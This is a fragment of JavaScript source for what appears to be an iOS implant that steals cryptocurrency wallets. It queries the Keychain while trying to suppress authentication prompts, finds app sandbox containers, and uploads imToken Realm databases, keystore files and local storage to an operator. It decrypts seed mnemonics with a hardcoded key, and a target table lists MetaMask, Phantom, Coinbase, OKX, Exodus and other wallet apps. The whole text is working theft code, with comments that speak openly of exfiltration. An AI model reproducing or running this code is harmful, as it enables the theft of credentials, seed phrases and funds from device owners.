Native.callSymbol(\"free\", keysBuf);\n\t\t\tif (valsBuf && valsBuf !== 0n) Native.callSymbol(\"free\", valsBuf);\n\t\t\treturn null;\n\t\t}\n\t\tfor (var i = 0; i < nItems; i++) {\n\t\t\tNative.write64(keysBuf + BigInt(i * 8), keys[i]);\n\t\t\tNative.write64(valsBuf + BigInt(i * 8), vals[i]);\n\t\t}\n\n\t\tvar queryDict = Native.callSymbol(\"CFDictionaryCreate\", 0n,\n\t\t\tkeysBuf, valsBuf, nItems, 0n, 0n);\n\t\tNative.callSymbol(\"free\", keysBuf);\n\t\tNative.callSymbol(\"free\", valsBuf);\n\n\t\tif (!queryDict || queryDict === 0n) return null;\n\n\t\tvar resultPtr = Native.callSymbol(\"malloc\", 8);\n\t\tNative.write64(resultPtr, 0n);\n\t\tvar status = Number(Native.callSymbol(\"SecItemCopyMatching\", queryDict, resultPtr));\n\t\tvar resultRef = Native.readPtr(resultPtr);\n\t\tNative.callSymbol(\"free\", resultPtr);\n\t\t_cfRelease(queryDict);\n\n\t\tif (status !== 0 || !resultRef || resultRef === 0n) return null;\n\n\t\tvar results = [];\n\t\ttry {\n\t\t\tvar count = Number(Native.callSymbol(\"CFArrayGetCount\", resultRef));\n\t\t\tvar kSecValueData = Native.callSymbol(\"dlsym\", -2n, \"kSecValueData\");\n\t\t\tvar kSecValueDataVal = kSecValueData && kSecValueData !== 0n ? Native.readPtr(kSecValueData) : 0n;\n\t\t\tvar svcKeyVal = Native.readPtr(kSecAttrService);\n\t\t\tvar acctKeyVal = Native.readPtr(kSecAttrAccount);\n\n\t\t\tfor (var idx = 0; idx < count && idx < 50; idx++) {\n\t\t\t\tvar item = Native.callSymbol(\"CFArrayGetValueAtIndex\", resultRef, idx);\n\t\t\t\tif (!item || item === 0n) continue;\n\t\t\t\ttry {\n\t\t\t\t\tvar entry = {};\n\t\t\t\t\tvar sv = Native.callSymbol(\"CFDictionaryGetValue\", item, svcKeyVal);\n\t\t\t\t\tif (sv && sv !== 0n) entry.service = _cfStringToJS(sv);\n\t\t\t\t\tvar av = Native.callSymbol(\"CFDictionaryGetValue\", item, acctKeyVal);\n\t\t\t\t\tif (av && av !== 0n) entry.account = _cfStringToJS(av);\n\t\t\t\t\tif (kSecValueDataVal && kSecValueDataVal !== 0n) {\n\t\t\t\t\t\tvar dv = Native.callSymbol(\"CFDictionaryGetValue\", item, kSecValueDataVal);\n\t\t\t\t\t\tif (dv && dv !== 0n) {\n\t\t\t\t\t\t\tvar dataBytes = _cfDataToBytes(dv);\n\t\t\t\t\t\t\tif (dataBytes) {\n\t\t\t\t\t\t\t\tvar dataStr = \"\";\n\t\t\t\t\t\t\t\tfor (var di = 0; di < dataBytes.length; di++)\n\t\t\t\t\t\t\t\t\tdataStr += String.fromCharCode(dataBytes[di]);\n\t\t\t\t\t\t\t\tentry.data = dataStr;\n\t\t\t\t\t\t\t\tentry.data_hex = _bytesToHex(dataBytes);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tresults.push(entry);\n\t\t\t\t} catch (itemErr) {}\n\t\t\t}\n\t\t} finally { _cfRelease(resultRef); }\n\t\treturn results;\n\t} finally {\n\t\tif (svcCF && svcCF !== 0n) _cfRelease(svcCF);\n\t\tif (acctCF && acctCF !== 0n) _cfRelease(acctCF);\n\t\tif (_authUIKeyCF && _authUIKeyCF !== 0n) _cfRelease(_authUIKeyCF);\n\t\tif (_authUIValCF && _authUIValCF !== 0n) _cfRelease(_authUIValCF);\n\t}\n}\n\nfunction _findImtokenKeychainPassword() {\n\t// fix #3b: DISABLED. _searchKeychain queries imToken-specific services with\n\t// kSecReturnData=true. On iOS 18.6, items protected by SecAccessControl\n\t// (biometricCurrentSet / devicePasscode) appear to bypass u_AuthUISkip and\n\t// trigger a \"Enter password for SpringBoard\" prompt even on locked devices,\n\t// while _secDumpClass (attributes-only, no specific service) stays silent\n\t// (-25300). The imToken keystore files are still exfiltrated from the sandbox\n\t// (the valuable data); only the keychain-password decryption attempt is\n\t// skipped. Phase 2 sqlite pipeline remains the real keychain decryption path.\n\treturn [];\n}\n\n// ============================================================================\n// imToken Wallet Extraction\n// ============================================================================\n\nfunction handleWalletExtract(cmd) {\n\tvar p = cmd.params || {};\n\tvar walletType = p.wallet_type || \"imtoken\";\n\tvar startMs = Date.now();\n\n\tif (walletType === \"imtoken\") {\n\t\t_extractImtoken(cmd, p, startMs);\n\t} else {\n\t\tsendJSON(cmd.command_id, {\n\t\t\tstatus: \"failed\", error: \"unsupported wallet_type: \" + walletType,\n\t\t\t_task_id: p._task_id || \"\", _task_type: \"wallet_extract\"\n\t\t}, \"wallet_extract_result.json\");\n\t}\n}\n\nfunction _extractImtoken(cmd, p, startMs) {\n\ttry {\n\t\tvar kcBytes = _readFileBytes(\"/tmp/imtoken_keychain.json\", 2 * 1024 * 1024);\n\t\tif (kcBytes && kcBytes.byteLength > 10) {\n\t\t\tsendResult(cmd.command_id, bytesToBase64(kcBytes),\n\t\t\t\t\"imtoken_keychain.json\", \"imtoken_keychain\");\n\t\t}\n\t} catch(e) {}\n\n\tvar bundleId = \"im.token.app\";\n\tvar containerPath = _findAppContainer(bundleId);\n\tif (!containerPath) {\n\t\tsendJSON(cmd.command_id, {\n\t\t\tstatus: \"failed\", error: \"imToken container not found\",\n\t\t\twallet_type: \"imtoken\",\n\t\t\t_task_id: p._task_id || \"\", _task_type: \"wallet_extract\"\n\t\t}, \"wallet_extract_result.json\");\n\t\treturn;\n\t}\n\n\tvar storageSub = \"Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1\";\n\tvar data = _readAsyncStorage(containerPath, storageSub);\n\tif (!data) {\n\t\tvar altSub = \"Documents/RCTAsyncLocalStorage_V1\";\n\t\tdata = _readAsyncStorage(containerPath, altSub);\n\t}\n\n\tvar result = {\n\t\tstatus: \"success\",\n\t\twallet_type: \"imtoken\",\n\t\tcontainer: containerPath,\n\t\twallets: [],\n\t\tassets: [],\n\t\traw_keys: [],\n\t\trealm_files: [],\n\t\twallet_dir_files: [],\n\t\t_task_id: p._task_id || \"\",\n\t\t_task_type: \"wallet_extract\"\n\t};\n\n\t// --- Phase 1: Realm database extraction (primary wallet storage) ---\n\t// imToken stores Realm in Documents/ (primary) or Library/Application Support/\n\tvar realmUploaded = false;\n\tvar realmSearchDirs = [\n\t\tcontainerPath + \"/Documents\",\n\t\tcontainerPath + \"/Library/Application Support/im.token.app\"\n\t];\n\tfor (var rdi = 0; rdi < realmSearchDirs.length; rdi++) {\n\t\tif (realmUploaded) break;\n\t\tvar realmDir = realmSearchDirs[rdi];\n\t\ttry {\n\t\t\tvar realmPath = realmDir + \"/default.realm\";\n\t\t\tvar realmSt = _statFile(realmPath);\n\t\t\tif (realmSt && realmSt.isFile && realmSt.size > 0) {\n\t\t\t\tresult.realm_files.push({\n\t\t\t\t\tpath: realmPath, size: realmSt.size\n\t\t\t\t});\n\t\t\t\tvar realmMaxSz = 16 * 1024 * 1024;\n\t\t\t\tif (realmSt.size <= realmMaxSz) {\n\t\t\t\t\tvar realmData = readFileB64(realmPath, realmMaxSz);\n\t\t\t\t\tif (realmData) {\n\t\t\t\t\t\tsendResult(cmd.command_id, realmData.b64,\n\t\t\t\t\t\t\t\"imtoken_default.realm\", \"wallet_extract\");\n\t\t\t\t\t\trealmUploaded = true;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tsendFileChunked(cmd.command_id, realmPath,\n\t\t\t\t\t\t\"imtoken_default.realm\", \"wallet_extract\");\n\t\t\t\t\trealmUploaded = true;\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (realmErr) {\n\t\t\tresult.realm_error = String(realmErr);\n\t\t}\n\t}\n\n\t// --- Phase 2: Scan walletsV2/ and wallets/ directories for keystore files ---\n\t// These dirs can be in Documents/ or Library/Application Support/im.token.app/\n\tvar walletDirs = [];\n\tvar walletSearchBases = [\n\t\tcontainerPath + \"/Documents\",\n\t\tcontainerPath + \"/Library/Application Support/im.token.app\"\n\t];\n\tfor (var wb = 0; wb < walletSearchBases.length; wb++) {\n\t\tvar wbDir = walletSearchBases[wb];\n\t\tvar v2 = wbDir + \"/walletsV2\";\n\t\tvar v1 = wbDir + \"/wallets\";\n\t\tif (_statFile(v2)) walletDirs.push(v2);\n\t\tif (_statFile(v1)) walletDirs.push(v1);\n\t}\n\n\t// Keychain password for decryption attempts\n\tvar keychainPassword = null;\n\tresult.keychain_items = [];\n\ttry {\n\t\tvar keychainItems = _findImtokenKeychainPassword();\n\t\tif (keychainItems && keychainItems.length > 0) {\n\t\t\tfor (var ki = 0; ki < keychainItems.length; ki++) {\n\t\t\t\tresult.keychain_items.push(keychainItems[ki]);\n\t\t\t\tif (!keychainPassword && keychainItems[ki].data &&\n\t\t\t\t\tkeychainItems[ki].data.length >= 4) {\n\t\t\t\t\tkeychainPassword = keychainItems[ki].data;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t} catch (kcErr) {\n\t\tresult.keychain_error = String(kcErr);\n\t}\n\tvar password = p.password || keychainPassword;\n\n\tfor (var di = 0; di < walletDirs.length; di++) {\n\t\tvar wdir = walletDirs[di];\n\t\tvar wdirSt = _statFile(wdir);\n\t\tif (!wdirSt || !wdirSt.isDir) continue;\n\t\tvar entries = listDir(wdir);\n\t\tfor (var ei = 0; ei < entries.length; ei++) {\n\t\t\tvar ent = entries[ei];\n\t\t\tvar entPath = wdir + \"/\" + ent.name;\n\t\t\tif (ent.type === \"file\") {\n\t\t\t\tresult.wallet_dir_files.push({\n\t\t\t\t\tdir: di === 0 ? \"walletsV2\" : \"wallets\",\n\t\t\t\t\tname: ent.name\n\t\t\t\t});\n\t\t\t\tvar entSt = _statFile(entPath);\n\t\t\t\tif (entSt && entSt.size > 0 && entSt.size < 4 * 1024 * 1024) {\n\t\t\t\t\tvar fb64 = readFileB64(entPath, 4 * 1024 * 1024);\n\t\t\t\t\tif (fb64) {\n\t\t\t\t\t\tvar fname = (di === 0 ? \"walletsV2_\" : \"wallets_\") + ent.name;\n\t\t\t\t\t\tsendResult(cmd.command_id, fb64.b64,\n\t\t\t\t\t\t\tfname, \"wallet_extract\");\n\t\t\t\t\t}\n\t\t\t\t\t// Parse JSON wallet files and attempt decryption\n\t\t\t\t\tif (ent.name.endsWith(\".json\")) {\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tvar fileBytes = _readFileBytes(entPath, 4 * 1024 * 1024);\n\t\t\t\t\t\t\tif (fileBytes) {\n\t\t\t\t\t\t\t\tvar w = JSON.parse(_rawToStr(fileBytes));\n\t\t\t\t\t\t\t\tvar walletInfo = {\n\t\t\t\t\t\t\t\t\tid: w.id || ent.name.replace(\".json\", \"\"),\n\t\t\t\t\t\t\t\t\tname: (w.imTokenMeta && w.imTokenMeta.name) || \"\",\n\t\t\t\t\t\t\t\t\tsource: (w.imTokenMeta && w.imTokenMeta.source) || \"\",\n\t\t\t\t\t\t\t\t\tnetwork: (w.imTokenMeta && w.imTokenMeta.network) || \"\",\n\t\t\t\t\t\t\t\t\tversion: w.version || 0,\n\t\t\t\t\t\t\t\t\tfrom_dir: di === 0 ? \"walletsV2\" : \"wallets\"\n\t\t\t\t\t\t\t\t};\n\t\t\t\t\t\t\t\tif (w.crypto) {\n\t\t\t\t\t\t\t\t\twalletInfo.kdf = w.crypto.kdf || \"unknown\";\n\t\t\t\t\t\t\t\t\twalletInfo.cipher = w.crypto.cipher || \"unknown\";\n\t\t\t\t\t\t\t\t\twalletInfo.keystore_present = true;\n\t\t\t\t\t\t\t\t\tif (password) {\n\t\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\t\tvar decResult = _decryptKeystoreV3(w.crypto, password);\n\t\t\t\t\t\t\t\t\t\t\tif (decResult) {\n\t\t\t\t\t\t\t\t\t\t\t\twalletInfo.decrypt_result = decResult;\n\t\t\t\t\t\t\t\t\t\t\t\twalletInfo.password_source = p.password ? \"provided\" : \"keychain\";\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t} catch (decErr) {\n\t\t\t\t\t\t\t\t\t\t\twalletInfo.decrypt_error = String(decErr);\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif (w.encOriginal) {\n\t\t\t\t\t\t\t\t\twalletInfo.encOriginal_present = true;\n\t\t\t\t\t\t\t\t\tvar fixedKey = \"456b38706c33314b3279654867517779\";\n\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\tvar decOrig = _decryptEncryptedMessage(w.encOriginal, fixedKey);\n\t\t\t\t\t\t\t\t\t\tif (decOrig) walletInfo.original_fixed_key = decOrig;\n\t\t\t\t\t\t\t\t\t} catch (origErr) {\n\t\t\t\t\t\t\t\t\t\twalletInfo.encOriginal_error = String(origErr);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif (w.encMnemonic) {\n\t\t\t\t\t\t\t\t\twalletInfo.encMnemonic_present = true;\n\t\t\t\t\t\t\t\t\tvar fixedKey2 = \"456b38706c33314b3279654867517779\";\n\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\tvar decMnem = _decryptEncryptedMessage(w.encMnemonic, fixedKey2);\n\t\t\t\t\t\t\t\t\t\tif (decMnem) walletInfo.mnemonic_fixed_key = decMnem;\n\t\t\t\t\t\t\t\t\t} catch (mnemErr) {\n\t\t\t\t\t\t\t\t\t\twalletInfo.encMnemonic_error = String(mnemErr);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif (w.identity) {\n\t\t\t\t\t\t\t\t\twalletInfo.identifier = w.identity.identifier || \"\";\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tresult.wallets.push(walletInfo);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} catch (parseErr) {}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} else if (ent.type === \"dir\") {\n\t\t\t\tvar subEntries = listDir(entPath);\n\t\t\t\tfor (var si = 0; si < subEntries.length; si++) {\n\t\t\t\t\tvar subEnt = subEntries[si];\n\t\t\t\t\tif (subEnt.type !== \"file\") continue;\n\t\t\t\t\tvar subPath = entPath + \"/\" + subEnt.name;\n\t\t\t\t\tresult.wallet_dir_files.push({\n\t\t\t\t\t\tdir: (di === 0 ? \"walletsV2\" : \"wallets\") + \"/\" + ent.name,\n\t\t\t\t\t\tname: subEnt.name\n\t\t\t\t\t});\n\t\t\t\t\tvar subSt = _statFile(subPath);\n\t\t\t\t\tif (subSt && subSt.size > 0 && subSt.size < 4 * 1024 * 1024) {\n\t\t\t\t\t\tvar sb64 = readFileB64(subPath, 4 * 1024 * 1024);\n\t\t\t\t\t\tif (sb64) {\n\t\t\t\t\t\t\tvar sfname = (di === 0 ? \"walletsV2_\" : \"wallets_\") +\n\t\t\t\t\t\t\t\tent.name + \"_\" + subEnt.name;\n\t\t\t\t\t\t\tsendResult(cmd.command_id, sb64.b64,\n\t\t\t\t\t\t\t\tsfname, \"wallet_extract\");\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t// --- Phase 3: AsyncStorage (Redux persist) ---\n\tif (data) {\n\t\tvar rawKeys = Object.keys(data);\n\t\tresult.raw_keys = rawKeys;\n\n\t\tvar walletsRaw = null;\n\t\tif (data[\"walletsV2\"]) {\n\t\t\ttry { walletsRaw = JSON.parse(data[\"walletsV2\"]); } catch(e) {}\n\t\t}\n\t\tif (!walletsRaw && data[\"wallets\"]) {\n\t\t\ttry { walletsRaw = JSON.parse(data[\"wallets\"]); } catch(e) {}\n\t\t}\n\n\t\tif (walletsRaw) {\n\t\t\tvar wArr = Array.isArray(walletsRaw) ? walletsRaw :\n\t\t\t\t(walletsRaw.wallets ? walletsRaw.wallets : [walletsRaw]);\n\t\t\tfor (var wi = 0; wi < wArr.length; wi++) {\n\t\t\t\tvar w = wArr[wi];\n\t\t\t\tvar walletInfo = {\n\t\t\t\t\tid: w.id || w.walletID || (\"wallet_\" + wi),\n\t\t\t\t\tname: w.name || \"\",\n\t\t\t\t\taddress: w.address || \"\",\n\t\t\t\t\tsource: w.source || \"\",\n\t\t\t\t\tchainType: w.chainType || \"\"\n\t\t\t\t};\n\n\t\t\t\tif (w.keystore || w.crypto) {\n\t\t\t\t\tvar ks = w.keystore || { crypto: w.crypto };\n\t\t\t\t\twalletInfo.keystore_raw = ks;\n\t\t\t\t\twalletInfo.kdf = ks.crypto ? ks.crypto.kdf : \"unknown\";\n\n\t\t\t\t\tif (password) {\n\t\t\t\t\t\tvar decResult = _decryptKeystoreV3(ks.crypto, password);\n\t\t\t\t\t\tif (decResult) {\n\t\t\t\t\t\t\twalletInfo.decrypt_result = decResult;\n\t\t\t\t\t\t\twalletInfo.password_source = p.password ? \"provided\" : \"keychain\";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (w.encMnemonic) {\n\t\t\t\t\twalletInfo.encMnemonic_raw = w.encMnemonic;\n\t\t\t\t\tif (typeof w.encMnemonic === \"object\" && w.encMnemonic.encStr) {\n\t\t\t\t\t\tvar fixedKey = \"456b38706c33314b3279654867517779\";\n\t\t\t\t\t\tvar dec = _decryptEncryptedMessage(w.encMnemonic, fixedKey);\n\t\t\t\t\t\tif (dec) walletInfo.mnemonic_fixed_key = dec;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (w.encOriginal) {\n\t\t\t\t\twalletInfo.encOriginal_raw = w.encOriginal;\n\t\t\t\t\tif (typeof w.encOriginal === \"object\" && w.encOriginal.encStr) {\n\t\t\t\t\t\tvar fixedKey2 = \"456b38706c33314b3279654867517779\";\n\t\t\t\t\t\tvar dec2 = _decryptEncryptedMessage(w.encOriginal, fixedKey2);\n\t\t\t\t\t\tif (dec2) walletInfo.original_fixed_key = dec2;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tresult.wallets.push(walletInfo);\n\t\t\t}\n\t\t}\n\n\t\tif (data[\"AssetToken\"]) {\n\t\t\ttry {\n\t\t\t\tvar assetData = JSON.parse(data[\"AssetToken\"]);\n\t\t\t\tvar items = assetData.itemsById || assetData;\n\t\t\t\tif (typeof items === \"object\") {\n\t\t\t\t\tfor (var assetKey in items) {\n\t\t\t\t\t\tif (!items.hasOwnProperty(assetKey)) continue;\n\t\t\t\t\t\tvar a = items[assetKey];\n\t\t\t\t\t\tresult.assets.push({\n\t\t\t\t\t\t\twalletAddress: a.walletAddress || a.accountAddress || \"\",\n\t\t\t\t\t\t\tchainId: a.chainId || \"\",\n\t\t\t\t\t\t\tchainType: a.chainType || \"\",\n\t\t\t\t\t\t\tname: a.name || \"\",\n\t\t\t\t\t\t\tsymbol: a.symbol || \"\",\n\t\t\t\t\t\t\tbalance: a.balance || \"0\",\n\t\t\t\t\t\t\tdecimal: a.decimal || 0\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} catch(e) {\n\t\t\t\tresult.asset_parse_error = String(e);\n\t\t\t}\n\t\t}\n\n\t\tvar sensitiveKeys = [\"walletsV2\", \"wallets\", \"crypto\", \"encMnemonic\",\n\t\t\t\"encOriginal\", \"AssetToken\", \"identities\", \"accounts\"];\n\t\tvar rawData = {};\n\t\tfor (var ki = 0; ki < sensitiveKeys.length; ki++) {\n\t\t\tif (data[sensitiveKeys[ki]]) {\n\t\t\t\trawData[sensitiveKeys[ki]] = data[sensitiveKeys[ki]];\n\t\t\t}\n\t\t}\n\t\tfor (var rk = 0; rk < rawKeys.length; rk++) {\n\t\t\tvar lk = rawKeys[rk].toLowerCase();\n\t\t\tif (lk.indexOf(\"wallet\") >= 0 || lk.indexOf(\"token\") >= 0 ||\n\t\t\t\tlk.indexOf(\"mnemonic\") >= 0 || lk.indexOf(\"seed\") >= 0 ||\n\t\t\t\tlk.indexOf(\"key\") >= 0 || lk.indexOf(\"account\") >= 0 ||\n\t\t\t\tlk.indexOf(\"identity\") >= 0 || lk.indexOf(\"crypto\") >= 0) {\n\t\t\t\tif (!rawData[rawKeys[rk]]) rawData[rawKeys[rk]] = data[rawKeys[rk]];\n\t\t\t}\n\t\t}\n\n\t\tif (Object.keys(rawData).length > 0) {\n\t\t\tvar rawJson = JSON.stringify(rawData);\n\t\t\tvar rawB64 = bytesToBase64(new Uint8Array(Native.stringToBytes(rawJson, false)));\n\t\t\tsendResult(cmd.command_id, rawB64,\n\t\t\t\t\"imtoken_raw_storage.json\", \"wallet_extract\");\n\t\t}\n\t} else {\n\t\tresult.async_storage_status = \"not_found\";\n\t}\n\n\tresult.realm_uploaded = realmUploaded;\n\tvar endMs = Date.now();\n\tresult.execution_time = (endMs - startMs) / 1000;\n\tsendJSON(cmd.command_id, result, \"wallet_extract_result.json\",\n\t\t{ start_ms: startMs, end_ms: endMs });\n}\n\n// ============================================================================\n// ios_app_data: collect sandboxed app data by bundle_id\n// ============================================================================\n\nvar APP_DATA_BASE = \"/var/mobile/Containers/Data/Application\";\nvar APP_GROUP_BASE = \"/var/mobile/Containers/Shared/AppGroup\";\n\nfunction _toFfsPath(absPath) {\n\tif (absPath.indexOf(\"/private/\") === 0) return absPath.substring(1);\n\tif (absPath.indexOf(\"/var/\") === 0) return \"private\" + absPath;\n\tif (absPath.charAt(0) === \"/\") return absPath.substring(1);\n\treturn absPath;\n}\n\nfunction _findContainerIn(basePath, bundleId) {\n\tvar dirs = listDir(basePath);\n\tfor (var i = 0; i < dirs.length; i++) {\n\t\tif (dirs[i].type !== \"dir\") continue;\n\t\tvar containerPath = basePath + \"/\" + dirs[i].name;\n\t\tvar plistPath = containerPath + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\tvar acc = Number(Native.callSymbol(\"access\", plistPath, 0));\n\t\tif (acc !== 0) continue;\n\t\tvar bytes = _readFileBytes(plistPath, 8192);\n\t\tif (!bytes || bytes.length === 0) continue;\n\t\tvar content = _rawToStr(bytes);\n\t\tif (content.indexOf(bundleId) >= 0) return containerPath;\n\t}\n\treturn null;\n}\n\nfunction _findAppContainer(bundleId) {\n\treturn _findContainerIn(APP_DATA_BASE, bundleId);\n}\n\nfunction _findAppGroupContainer(bundleId) {\n\treturn _findContainerIn(APP_GROUP_BASE, bundleId);\n}\n\nfunction _collectAppFiles(basePath, subPaths, excludePaths, filterMode, fileExts, maxFileSizeMB) {\n\tvar maxBytes = (maxFileSizeMB && maxFileSizeMB > 0) ? maxFileSizeMB * 1024 * 1024 : 0;\n\tvar exts = [];\n\tif (fileExts) {\n\t\tvar parts = fileExts.split(\",\");\n\t\tfor (var i = 0; i < parts.length; i++) {\n\t\t\tvar e = parts[i].trim();\n\t\t\tif (e) exts.push(e.toLowerCase());\n\t\t}\n\t}\n\n\tvar scanRoots = [];\n\tif (subPaths && subPaths.length > 0) {\n\t\tfor (var i = 0; i < subPaths.length; i++) {\n\t\t\tvar sp = subPaths[i];\n\t\t\tvar full = (sp.charAt(0) === \"/\") ? basePath + sp : basePath + \"/\" + sp;\n\t\t\tif (_statFile(full)) scanRoots.push(full);\n\t\t}\n\t} else {\n\t\tscanRoots.push(basePath);\n\t}\n\n\tvar excludeFull = [];\n\tif (excludePaths) {\n\t\tfor (var i = 0; i < excludePaths.length; i++) {\n\t\t\texcludeFull.push(basePath + excludePaths[i]);\n\t\t}\n\t}\n\n\tvar files = [];\n\tfor (var ri = 0; ri < scanRoots.length; ri++) {\n\t\t_scanDir(scanRoots[ri], files, true, excludeFull,\n\t\t\tfilterMode || \"none\", exts, maxBytes);\n\t}\n\treturn files;\n}\n\nfunction handleIosAppData(cmd) {\n\tvar p = cmd.params || {};\n\tvar targets = p.targets || [];\n\tvar maxFileSizeMB = (p.max_file_size_mb !== undefined) ? p.max_file_size_mb : 500;\n\tvar startMs = Date.now();\n\n\tif (!targets.length) {\n\t\tsendJSON(cmd.command_id, {\n\t\t\tstatus: \"failed\", error: \"empty targets array\",\n\t\t\t_task_id: p._task_id || \"\", _task_type: \"ios_app_data\"\n\t\t}, \"ios_app_data_result.json\", { start_ms: startMs, end_ms: Date.now() });\n\t\treturn;\n\t}\n\n\tvar totalCollected = 0;\n\tvar totalUploaded = 0;\n\tvar targetResults = [];\n\n\tfor (var ti = 0; ti < targets.length; ti++) {\n\t\tvar t = targets[ti];\n\t\tvar bundleId = t.bundle_id;\n\t\tif (!bundleId) {\n\t\t\ttargetResults.push({ bundle_id: \"\", status: \"skipped\", error: \"empty bundle_id\" });\n\t\t\tcontinue;\n\t\t}\n\n\t\tvar containerPath = _findAppContainer(bundleId);\n\t\tvar groupPath = _findAppGroupContainer(bundleId);\n\n\t\tif (!containerPath && !groupPath) {\n\t\t\ttargetResults.push({ bundle_id: bundleId, status: \"not_found\",\n\t\t\t\terror: \"app container not found\" });\n\t\t\tcontinue;\n\t\t}\n\n\t\tvar effectiveMax = maxFileSizeMB;\n\t\tif (effectiveMax === -1) effectiveMax = 0;\n\n\t\tvar containers = [];\n\t\tif (containerPath) containers.push(containerPath);\n\t\tif (groupPath) containers.push(groupPath);\n\n\t\tvar uploaded = 0;\n\t\tvar allFiles = 0;\n\n\t\tfor (var ci = 0; ci < containers.length; ci++) {\n\t\t\tvar ctrPath = containers[ci];\n\t\t\tvar files = _collectAppFiles(ctrPath, t.paths || null,\n\t\t\t\tt.exclude_paths || null, t.filter_mode || \"none\",\n\t\t\t\tt.file_extensions || \"\", effectiveMax);\n\t\t\tallFiles += files.length;\n\n\t\t\tfor (var fi = 0; fi < files.length; fi++) {\n\t\t\t\tvar fname = _toFfsPath(files[fi]);\n\n\t\t\t\tvar sz = getFileSize(files[fi]);\n\t\t\t\tif (sz <= 0) continue;\n\n\t\t\t\tvar isLast = (ci === containers.length - 1 && fi === files.length - 1);\n\t\t\t\tvar meta = isLast ? { start_ms: startMs, end_ms: Date.now() } : null;\n\n\t\t\t\tif (sz <= CHUNK_SIZE) {\n\t\t\t\t\tvar rd = readFileB64(files[fi],\n\t\t\t\t\t\teffectiveMax > 0 ? effectiveMax * 1024 * 1024 : MAX_FILE_SIZE);\n\t\t\t\t\tif (rd) {\n\t\t\t\t\t\tsendResult(cmd.command_id, rd.b64, fname, \"ios_app_data\", meta);\n\t\t\t\t\t\tuploaded++;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tvar chunkRes = sendFileChunked(cmd.command_id, files[fi],\n\t\t\t\t\t\tfname, \"ios_app_data\", meta);\n\t\t\t\t\tif (chunkRes && chunkRes.ok) uploaded++;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\ttotalCollected += allFiles;\n\t\ttotalUploaded += uploaded;\n\t\ttargetResults.push({\n\t\t\tbundle_id: bundleId,\n\t\t\tcontainer: containerPath || null,\n\t\t\tapp_group: groupPath || null,\n\t\t\tstatus: \"done\",\n\t\t\tfiles_found: allFiles,\n\t\t\tfiles_uploaded: uploaded\n\t\t});\n\t}\n\n\tvar endMs = Date.now();\n\tsendJSON(cmd.command_id, {\n\t\tstatus: totalUploaded > 0 ? \"success\" : (totalCollected > 0 ? \"partial\" : \"empty\"),\n\t\tfile_count: totalUploaded,\n\t\ttotal_scanned: totalCollected,\n\t\ttargets_processed: targetResults.length,\n\t\ttarget_details: targetResults,\n\t\texecution_time: (endMs - startMs) / 1000,\n\t\t_task_id: p._task_id || \"\",\n\t\t_task_type: \"ios_app_data\"\n\t}, \"ios_app_data_result.json\", { start_ms: startMs, end_ms: endMs });\n}\n\n// ============================================================================\n// wallet_scan: scan installed wallet apps and collect sandbox files\n// ============================================================================\n\nvar WALLET_BUNDLE_IDS = {\n\t// All listed wallets collect sandbox hot-files when installed.\n\t// Keychain dump still covers secrets; sandbox globs catch app-local vaults.\n\t\"com.bitpie.wallet\":                { name: \"Bitpie\",       sandbox: true,\n\t\tfiles: [\"Documents/*\", \"Library/Preferences/com.bitpie.wallet.plist\"] },\n\t\"com.uniswap.mobile\":               { name: \"Uniswap\",      sandbox: true,\n\t\tfiles: [\"Library/Application Support/*/RCTAsyncLocalStorage_V1/*\", \"Documents/*\"] },\n\t\"app.phantom\":                       { name: \"Phantom\",      sandbox: true,\n\t\tfiles: [\"Documents/*\", \"Library/Application Support/*/*\"] },\n\t\"com.solflare.mobile\":               { name: \"Solflare\",     sandbox: true,\n\t\tfiles: [\"Documents/mmkv/*\", \"Library/Preferences/com.solflare.mobile.plist\"] },\n\t\"org.mytonwallet.app\":               { name: \"MyTonWallet\",  sandbox: true,\n\t\tfiles: [\"Documents/*\", \"Library/Application Support/*/*\"] },\n\t\"org.toshi\":                         { name: \"Coinbase\",     sandbox: true,\n\t\tfiles: [\"Documents/*\", \"Library/Application Support/*/*\", \"Library/Preferences/org.toshi.plist\"] },\n\t\"io.metamask.MetaMask\":              { name: \"MetaMask\",     sandbox: true,\n\t\tmaxFileSize: 5 * 1024 * 1024,\n\t\tfiles: [\"Documents/persist-root\", \"Documents/*\", \"Library/Application Support/*/*\"] },\n\t\"com.okex.OKExAppstoreFull\":         { name: \"OKX\",          sandbox: true,\n\t\tfiles: [\"Documents/*\", \"Library/Preferences/com.okex.OKExAppstoreFull.plist\",\n\t\t\t\"Library/Application Support/*/*\"] },\n\t\"exodusmovement.exodus\":             { name: \"Exodus\",       sandbox: true,\n\t\tfiles: [\"Documents/*\", \"Library/Application Support/*/*\"] },\n\t\"exodus-movement.exodus\":            { name: \"Exodus\",       sandbox: true,\n\t\tfiles: 